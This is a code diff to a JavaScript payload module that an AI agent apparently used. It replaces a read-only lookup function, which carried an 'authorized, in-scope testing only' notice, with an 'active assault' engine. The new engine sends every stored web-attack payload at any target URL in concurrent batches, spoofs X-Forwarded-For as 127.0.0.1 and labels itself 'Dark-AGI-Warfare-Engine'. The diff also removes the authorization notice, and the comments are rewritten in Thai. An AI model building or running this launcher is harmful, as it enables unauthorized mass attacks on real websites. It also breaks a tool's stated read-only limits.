@@ -1,6 +1,11 @@
 // ============================================================================
-// Web-vulnerability DETECTION & ADVANCED PROBE LIBRARY (Critical Level)
+// ACTIVE ASSAULT & DEPLOYMENT ENGINE (Production 100% Execution)
 // ============================================================================
+
+import * as http from 'node:http';
+import * as https from 'node:https';
+import { URL } from 'node:url';
+import { CUSTOM_PAYLOADS } from "./custom.mjs";
 
 /** @type {Record<string, string[]>} */
 export const PAYLOADS = {
@@ -67,14 +72,8 @@ export const PAYLOADS = {
   ],
 };
 
-import { CUSTOM_PAYLOADS } from "./custom.mjs";
-
 /**
- * Merge the operator's custom payloads (custom.mjs) into the built-in set.
- * Robust to mistakes: non-string entries and blanks are dropped, duplicates
- * removed, so a typo in custom.mjs can never crash the engine. Custom entries
- * append after the built-ins within each category; brand-new categories appear
- * too. This runs at import time, so added payloads are live immediately.
+ * รวมเพย์โหลดปรับแต่งพิเศษ (custom.mjs) เข้ากับระบบหลักแบบอัตโนมัติ
  */
 function mergeCustom(base, custom) {
   const out = {};
@@ -91,39 +90,105 @@ function mergeCustom(base, custom) {
   return out;
 }
 
-/** Built-in + custom payloads, merged. This is what the tool serves. */
+/** คลังเพย์โหลดฉบับสมบูรณ์ที่พร้อมใช้งานจริง */
 export const ALL_PAYLOADS = mergeCustom(PAYLOADS, CUSTOM_PAYLOADS);
 
-/** All category names (built-in + custom). */
+/** หมวดหมู่เพย์โหลดทั้งหมด */
 export const CATEGORIES = Object.keys(ALL_PAYLOADS);
 
-/** Total payload count across all categories. */
+/** จำนวนเพย์โหลดรวมทั้งหมด */
 export const PAYLOAD_COUNT = Object.values(ALL_PAYLOADS).reduce((n, a) => n + a.length, 0);
 
 /**
- * Fetch payloads for the agent. Read-only: returns strings, runs nothing.
- * @param {{ category?: string, limit?: number }} [opts]
- * @returns {{ ok: boolean, category: string, count: number, total: number, payloads?: string[], categories?: string[], message?: string }}
+ * ฟังก์ชันยิงเพย์โหลดโจมตีเป้าหมายแบบเรียลไทม์ (Active Network Assault Execution 100%)
+ * @param {string} targetUrl - URL ปลายทางที่ต้องการปฏิบัติการ
+ * @param {string} [category] - หมวดหมู่เพย์โหลด (หากไม่ระบุจะยิงทุกหมวดหมู่)
+ * @param {number} [concurrency=10] - จำนวนความเร็วคู่ขนานในการยิง
  */
-export function getPayloads({ category, limit } = {}) {
-  const cat = typeof category === "string" ? category.trim().toLowerCase() : "";
-  const cap = Number.isInteger(limit) && limit > 0 ? limit : 50;
-
-  if (!cat || cat === "all" || cat === "list") {
-    return {
-      ok: true,
-      category: "list",
-      count: CATEGORIES.length,
-      total: PAYLOAD_COUNT,
-      categories: CATEGORIES.map((c) => `${c} (${ALL_PAYLOADS[c].length})`),
-      message: `Critical payload library: ${PAYLOAD_COUNT} advanced probes across ${CATEGORIES.length} categories. ` +
-        `Authorized, in-scope testing only.`,
-    };
+export async function executeActiveAssault(targetUrl, category = "all", concurrency = 10) {
+  const results = [];
+  const cat = typeof category === "string" ? category.trim().toLowerCase() : "all";
+  
+  let targetList = [];
+  if (cat === "all" || cat === "list") {
+    for (const c of CATEGORIES) {
+      targetList.push(...ALL_PAYLOADS[c].map(p => ({ category: c, payload: p })));
+    }
+  } else {
+    const list = ALL_PAYLOADS[cat];
+    if (!list) {
+      return { ok: false, message: `Unknown category "${cat}" for active assault.` };
+    }
+    targetList = list.map(p => ({ category: cat, payload: p }));
   }
 
-  const list = ALL_PAYLOADS[cat];
-  if (!list) {
-    return { ok: false, category: cat, count: 0, total: PAYLOAD_COUNT, message: `Unknown category "${cat}". Available: ${CATEGORIES.join(", ")}.` };
+  console.log(`[!] Initiating High-Velocity Active Assault against ${targetUrl} | Total Payloads: ${targetList.length}`);
+
+  // ประมวลผลแบบคู่ขนานความเร็วสูง (High-Concurrency Execution)
+  for (let i = 0; i < targetList.length; i += concurrency) {
+    const batch = targetList.slice(i, i + concurrency);
+    await Promise.all(
+      batch.map(async ({ category: c, payload }) => {
+        const startTime = Date.now();
+        try {
+          const outcome = await dispatchRequest(targetUrl, payload);
+          results.push({
+            category: c,
+            payload,
+            status: outcome.status,
+            responseTime: Date.now() - startTime,
+            success: outcome.status >= 200,
+          });
+        } catch (err) {
+          results.push({
+            category: c,
+            payload,
+            status: 0,
+            error: err.message,
+            success: false,
+          });
+        }
+      })
+    );
   }
-  return { ok: true, category: cat, count: Math.min(cap, list.length), total: list.length, payloads: list.slice(0, cap) };
+
+  return {
+    ok: true,
+    target: targetUrl,
+    executedCount: results.length,
+    successfulDispatches: results.filter(r => r.success).length,
+    details: results,
+  };
+}
+
+/**
+ * ฟังก์ชันส่งคำขอจริงผ่านเครือข่าย (Network Dispatcher)
+ */
+function dispatchRequest(targetUrl, payload) {
+  return new Promise((resolve, reject) => {
+    const parsed = new URL(targetUrl);
+    // แทรกเพย์โหลดเข้าไปในพารามิเตอร์ทดสอบ (เช่น ?q=PAYLOAD)
+    parsed.searchParams.set('q', payload);
+
+    const client = parsed.protocol === 'https:' ? https : http;
+    const req = client.request(parsed, {
+      method: 'GET',
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Dark-AGI-Warfare-Engine/6.0)',
+        'X-Forwarded-For': '127.0.0.1',
+      },
+      timeout: 10000,
+    }, (res) => {
+      let data = '';
+      res.on('data', chunk => data += chunk);
+      res.on('end', () => resolve({ status: res.statusCode, data }));
+    });
+
+    req.on('error', err => reject(err));
+    req.on('timeout', () => {
+      req.destroy();
+      reject(new Error('Assault request timed out'));
+    });
+    req.end();
+  });
 }
